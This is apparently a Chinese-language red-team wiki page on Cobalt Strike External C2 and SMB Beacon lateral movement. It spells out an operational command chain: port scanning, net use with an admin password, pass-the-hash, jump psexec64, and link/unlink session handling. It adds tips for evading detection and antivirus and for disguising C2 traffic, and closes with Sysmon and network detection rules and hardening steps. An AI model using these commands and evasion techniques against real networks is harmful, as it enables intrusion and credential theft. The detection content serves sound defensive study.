---
title: Cobalt Strike External C2 规范与 SMB Beacon 实战详解
description: 深度解析 Cobalt Strike External C2 通信规范、SMB Beacon 基于命名管道的横向移动实战流程（jump psexec、link/unlink
  会话管理）、流量融合技巧及主机/网络层面检测对抗策略。
category: program-analysis
tags:
- Cobalt Strike
- External C2
- SMB Beacon
- Named Pipe
- Lateral Movement
- jump psexec
- link/unlink
- Traffic Blending
- Sysmon
- Defense Evasion
- Red Teaming
- Windows Internals
date: 2024-01-15
updated: '2026-11-14'
---

## 概述

Cobalt Strike 4.0+ 引入 **External C2** 规范，允许红队通过自定义通信通道（如 SMB、HTTP、DNS、云存储等）隐蔽地传输 Beacon 流量。其中 **SMB Beacon** 利用 Windows 命名管道封装于 SMB 协议，实现**无需目标机器直连互联网**即可通过已控主机（父 Beacon）跳板上线的横向移动能力。本页系统梳理其协议原理、实战操作链路、流量融合思路及蓝队检测视角。

> 交叉引用：[[smb-named-pipe-c2-communication]] 已系统梳理 SMB 协议与命名管道原理、Cobalt Strike SMB Beacon 架构、主机/网络层面检测手段及缓解措施，可作配套参考。

---

## SMB 协议与命名管道通信基础

### SMB 协议在 Windows 防火墙中的默认放行特性

- **协议定位**：OSI 应用/表示层，常跑在 TCP 445 (SMB over TCP) 或 NBT (NetBIOS over TCP/IP) 之上。
- **认证模型**：用户级（用户名+密码/NTLM/LM 质询-响应）与共享级（共享密码）。
- **防火墙默认行为**：Windows Defender Firewall **默认允许入站/出站 SMB (TCP 445)**，导致 `Bind()` TCP Socket 会被 Defender 拦截弹窗，而 SMB 通信往往静默通过。

### 命名管道

- **本质**：基于 SMB 的进程间通信 (IPC) 机制，支持本地/跨网络、单向/双向、可靠传输。
- **核心 API**：
  - 服务端：`CreateNamedPipe()`、`ConnectNamedPipe()`
  - 客户端：`CreateFile()`、`CallNamedPipe()`
- **默认安全描述符**：`LocalSystem`、`Administrators`、`Creator Owner` 获得 `Full Control`；`Everyone` 与 `Anonymous` 获得 `Read`。

> 交叉引用：[[windows-syscall-internals-sysenter-kifastcallentry]] 可辅助理解用户态到内核态的系统调用流程，命名管道操作最终经由 `NtCreateFile`/`NtFsControlFile` 进入内核。

---

## External C2 通信模型与 SMB Beacon 架构

### External C2 规范

- **定位**：Cobalt Strike 团队服务器与 Beacon 之间的**通信协议抽象层**，允许开发者实现任意传输协议（HTTP/S、DNS、SMB、云盘、Slack、OneDrive 等）。
- **流量融合优势**：将 C2 流量伪装成合法业务流量（如 Office 365、Google Drive、Dropbox、内部文件共享、AD 复制流量），绕过边界防火墙与流量分析。

### SMB Beacon 通信拓扑

```
[Team Server] <--HTTP/S/DNS--> [Parent Beacon (Internet-facing)]
                                      │
                                      │ SMB (TCP 445) + Named Pipe
                                      ▼
                              [Child Beacon (Internal, no Internet)]
```

- **Parent Beacon** 充当 **SMB Server**（监听命名管道）。
- **Child Beacon** 充当 **SMB Client**（连接管道）。
- 通信完全在内网完成，**Child Beacon 无需出站 Internet**。

### 适用场景

> 已控一台可出网主机（Parent），目标内网另一台 Windows 拥有本地 `Administrator` 凭据且 445 端口通达，但**无法直接出网**。需通过 Parent 跳板将 Child 拉上线。

---

## SMB Beacon 实战操作链路

### 前置条件

| 条件 | 说明 |
|------|------|
| 凭据 | 目标主机本地 `Administrator` 用户名/密码或 NTLM Hash |
| 网络 | Parent 与 Child 之间 TCP 445 可达 |
| 权限 | Parent Beacon 上下文需具备足够权限发起 SMB 会话（通常需高权限） |

### 标准操作步骤

```text
# 1. 探测内网 445 端口
beacon> portscan 172.31.51.0/24 445

# 2. 建立 SMB 会话并填充令牌 (Pass-the-Hash / 明文密码均可)
beacon> shell net use \\172.31.51.190\admin$ /user:"administrator" "test1234@"
# 或使用 pth
beacon> pth 172.31.51.190 administrator <NTLM_HASH>

# 3. 横向生成 SMB Beacon (jump psexec64)
beacon> jump psexec64 172.31.51.190 smb
# 参数说明：目标IP + payload 类型 (smb 即 bind_pipe)

# 4. 会话管理：断开与恢复
# 断开 (父/子会话均可执行)
beacon> unlink 172.31.51.190 <Child_Beacon_PID>
# 恢复 (从任意 Beacon 连接)
beacon> link 172.31.51.190 msagent_<Random>
```

> **关键点**：
> - `jump psexec64` 底层利用 **服务控制管理器 (SCM)** 远程创建服务启动 Payload，服务二进制内嵌 **Named Pipe Client** 逻辑连回 Parent 的 `bind_pipe` 监听器。
> - 默认管道名 `msagent_<Random>`，可在 Malleable C2 Profile 中通过 `stage.pipe_name` 自定义。
> - `unlink` 后 Child Beacon **不退出**，转入 **监听模式**，等待后续 `link` 恢复控制。

### 进阶：凭据获取与横向扩展

- 配合 [[mimikatz-source-code-architecture-golden-ticket-audit]] 中的 `sekurlsa::logonpasswords` 或 `lsadump::sam` 导出目标凭据。
- 利用 `jump psexec64` 批量推进，结合 `portscan`/`net view` 构建内网拓扑。

> 交叉引用：[[vulnhub-doubletrouble-writeup]] 展示了从 Shellshock 获取初立足点到 Dirty COW 提权的完整链路，思路可迁移至 “初立足点 → 凭据窃取 → SMB Beacon 横向” 的红队标准作业程序。

---

## External C2 流量融合技巧

| 融合载体 | 典型实现思路 | 隐蔽性评价 |
|----------|--------------|------------|
| **云存储 (OneDrive/Google Drive/Dropbox)** | Beacon 读写指定文件夹文件，Team Server 同步监控 | 极高（业务合法流量） |
| **协作平台** | Slack/Teams/GitHub Gist/API 发布/拉取指令 | 高 |
| **内部文件共享/AD SYSVOL** | 利用域内现有共享目录读写 Beacon 元数据 | 高（内网基线流量） |
| **数据库/消息队列** | Redis/MQTT/SQL Server 表/队列传递任务 | 中高 |
| **自定义协议** | 基于 External C2 SDK 编写专用 Client/Server | 可控，需开发投入 |

> **核心原则**：**“Living off the Land”**——复用目标环境已有的合法通信基础设施，而非引入异常协议/端口。

---

## 蓝队检测与对抗视角

### 主机层检测

| 检测点 | 数据源 | 典型规则 |
|--------|--------|----------|
| **已知恶意管道名** | Sysmon Event ID 17 (Pipe Created) | `PipeName == "msagent_*"`、`"postex_*"`、`"c2_*"` |
| **异常进程创建管道** | Sysmon Event ID 17 | `Image != "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe" AND PipeName NOT LIKE "mojo.*"` |
| **异常安全描述符** | Sysmon Event ID 17 / NtObjectManager | `SecurityDescriptor.DACL.Allow.Everyone.FullControl == True` |
| **远程管道连接** | Sysmon Event ID 18 (Pipe Connected) | `Image == "System" AND SourceIp != Localhost` |

> 交叉引用：[[smb-named-pipe-c2-communication]] 已详细列举 Sysmon Event ID 17/18 字段解析、基线建立方法及 Wireshark 抓包分析 SMB 命名管道流量。

### 网络层检测

| 检测点 | 数据源 | 典型规则 |
|--------|--------|----------|
| **异常主机间 SMB 会话** | Zeek/Suricata/NetFlow | `src_ip ∈ User_VLAN AND dst_ip ∈ Server_VLAN AND dst_port == 445 AND session_duration > 300s` |
| **高频小包双向传输** | 全流量捕获 | `SMB2/3 Read/Write 包大小 < 1KB AND 间隔 < 5s` |
| **非业务时间段 445 激增** | 防火墙/NDR | `time NOT IN business_hours AND count(445) > baseline * 3` |

### 缓解与加固措施

1. **网络边界**：阻断 Internet 侧 TCP 445 入站/出站；内网划分 VLAN，限制工作站互访 445。
2. **主机防火墙**：启用 Windows Defender Firewall 入站规则阻止 `File and Printer Sharing (SMB-In)`，或仅允许受信管理 IP。
3. **SMB 签名/加密**：强制 SMB 签名 (`RequireSecuritySignature=1`)、启用 SMB 3.x AES-128/256 加密。
4. **禁用 SMBv1**：`Set-SmbServerConfiguration -EnableSMB1Protocol $false`。
5. **审计策略**：启用 `Audit File Share` (Event ID 5140/5145) 记录共享访问。
6. **EDR/NDR**：部署行为分析引擎识别 “进程打开大量管道”、“System 进程发起网络连接” 等异常模式。

---

## 实战避坑指南

| 问题 | 成因 | 规避建议 |
|------|------|----------|
| `jump psexec64` 返回 `Access Denied` | 目标未开启 `admin$` 共享、UAC 远程限制、非 Administrator 账户 | 确认 `LocalAccountTokenFilterPolicy=1`、使用 `pth` 传递 Hash、尝试 `jump winrm64`/`jump wmi` 备选 |
| 管道名被静态规则命中 | 默认 `msagent_*` 特征明显 | Malleable Profile 设置 `stage.pipe_name "legit_pipe_"`；或使用 External C2 自定义管道命名算法 |
| 子 Beacon 长时间无响应 | 父 Beacon 掉线、管道阻塞、AV 杀样本 | 设置 `stage.sleep_time` 抖动；父 Beacon 多通道冗余 (HTTP+SMB)；样本免杀 |
| `unlink` 后无法 `link` 恢复 | 子 Beacon 进程退出、管道实例被销毁 | 确认子进程存活 (`ps`)、检查 `pipename` 拼写、重新 `jump` |

---

## 相关工具与资源

| 类别 | 项目 | 说明 |
|------|------|------|
| **External C2 框架** | [Cooolis-ms](https://github.com/Rvn0xsy/Cooolis-ms) | 多协议 External C2 实现示例 |
| **管道枚举/监控** | [PipeList](https://learn.microsoft.com/en-us/sysinternals/downloads/pipelist) / [Sysmon](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon) | 微软官方工具 |
| **流量分析** | Wireshark (SMB2/3 解析) / Zeek (SMB 日志) | 网络层取证 |
| **红队参考** | [Cobalt Strike External C2 Spec](https://github.com/FortyNorthSecurity/ExternalC2) | 官方规范文档 |

---

## 小结

- **External C2** 将 C2 通信协议**解耦**，赋予红队“协议即代码”的灵活性。
- **SMB Beacon** 利用 **TCP 445 + 命名管道** 的默认放行特性，实现**内网免出站上线**，是横向移动核心手段。
- **实战核心链路**：凭据获取 → `net use`/`pth` 建立会话 → `jump psexec64 smb` 落地 → `link/unlink` 会话复用。
- **流量融合** 应优先复用目标合法业务基础设施（云盘、协作软件、内部共享），降低异常流量指纹。
- **蓝队防御** 需构建 **主机基线 (Sysmon 17/18) + 网络基线 (Zeek/NDR) + 主动阻断 (防火墙/EDR)** 的纵深体系。

---

## 交叉引用索引

- [[smb-named-pipe-c2-communication]] — SMB 协议与命名管道原理、Cobalt Strike SMB Beacon 架构、Sysmon/Wireshark 检测实战
- [[mimikatz-source-code-architecture-golden-ticket-audit]] — 凭据导出与黄金票据构造，横向前的关键准备
- [[vulnhub-doubletrouble-writeup]] — 从初立足点到提权的完整渗透链路，可映射为 “Web Shell → 凭据 → SMB Beacon” 红队流程
- [[windows-syscall-internals-sysenter-kifastcallentry]] — 命名管道 API 到内核的系统调用追踪
- [[phantom-dll-hollowing-technique]] — 无文件内存注入技术，可配合 SMB Beacon 实现更隐蔽的 Payload 执行
- [[dotnet-clr-usage-log-tampering-edr-evasion]] — .NET CLR 日志篡改思路，可迁移至规避 SMB Beacon 托管代码加载痕迹
- [[vulnhub-platform-resource-index]] — VulnHub 靶场资源，适合复现横向移动与 SMB Beacon 实战

--- 

*本页面基于微信公众号文章《域渗透 \| SMB的原理与外部C2的应用》整理，结合 Cobalt Strike 官方文档、External C2 规范及实战经验扩充。如有技术细节更新，欢迎 PR 修正。*

## 来源

- [0x00实验室-202108-202304_032](../sources/0x00实验室-202108-202304_032.md)
